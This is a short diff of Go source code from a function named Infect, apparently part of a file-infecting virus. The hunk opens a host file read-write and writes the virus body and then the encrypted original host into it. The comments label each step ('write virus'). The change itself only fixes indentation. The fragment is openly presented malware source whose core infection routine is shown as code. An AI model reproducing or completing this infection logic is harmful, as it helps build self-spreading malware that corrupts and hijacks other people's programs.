@@ -102,7 +102,7 @@ func Infect(file string) {
     f, err := os.OpenFile(file, os.O_RDWR , 0666) //open host
     check(err)
     
-      w := bufio.NewWriter(f)
+    w := bufio.NewWriter(f)
     w.Write(vir) //write virus
     w.Write(encDat) //write encypted host
     w.Flush() //make sure we are all set
